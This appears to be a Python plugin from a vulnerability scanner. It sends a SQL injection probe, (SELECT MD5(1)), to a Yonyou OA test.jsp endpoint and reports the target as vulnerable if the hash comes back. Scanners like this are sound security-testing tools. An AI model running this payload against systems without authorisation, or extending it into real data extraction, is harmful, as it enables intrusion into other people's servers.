import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def nc_u8_test_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(Vcolors.RED +"[+] 该系统可能存在SQL注入漏洞，具体URL为: {}".format(url)+Vcolors.ENDC)
            return url
        else:
            print(Vcolors.WARNING +"[x] 该系统的用友U8不存在SQL注入"+Vcolors.ENDC)
    except:
        logging.error("nc_u8_test_sql脚本出现异常")



